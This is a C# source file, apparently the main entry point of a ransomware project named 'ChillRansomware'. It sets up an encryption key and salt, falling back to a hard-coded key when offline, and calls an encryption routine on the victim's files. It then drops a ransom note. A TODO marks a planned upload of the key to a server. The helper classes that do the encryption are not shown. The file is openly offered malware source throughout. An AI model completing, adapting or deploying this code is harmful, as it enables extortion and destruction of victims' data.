using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Buffers.Text;
using System.IO;
using System.Threading;

namespace ChillRansomware
{
    class Program
    {
        public static User user = new User();
        //TODO: Change wallpaper on every OS
        static void Main(string[] args)
        {
            //Handle if user has or hasnt internet
            HandleInternet();

            if (Settings.DebugMode)
                File.WriteAllText("info.json", JsonConvert.SerializeObject(user));


            //TODO: Add upload to server here
            Encryption.StartEncryption(user.ransomInfo.EncryptionKey, user.ransomInfo.Salt);

            CreateMessage();
        }

        private static void HandleInternet()
        {
            bool HasInternet = Utils.CheckForInternetConnection();
            if (Settings.UseLocalKeyIfNoInternet)
            {
                if (HasInternet)
                {
                    user.ransomInfo.EncryptionKey = Utils.RandomString(Settings.KeyLength);
                    user.ransomInfo.Salt = Utils.RandomSaltBytes();
                    File.AppendAllText("AAAA.txt", user.ransomInfo.EncryptionKey);
                }
                else
                {
                    user.ransomInfo.EncryptionKey = Settings.HardCodedKey;
                    user.ransomInfo.Salt = Settings.HardCodedSaltBytes;
                }
            }
            else
            {
                user.ransomInfo.EncryptionKey = Utils.RandomString(Settings.KeyLength);
                user.ransomInfo.Salt = Utils.RandomSaltBytes();
                do
                {
                    HasInternet = Utils.CheckForInternetConnection();
                    if (HasInternet == false)
                        Thread.Sleep(5000);
                } while (HasInternet == false);
            }
        }

        static void CreateMessage()
        {
            if (!File.Exists(Settings.MessagePath))
            {
                File.WriteAllLines(Settings.MessagePath, Settings.MessageText);
            }
        }
    }
}
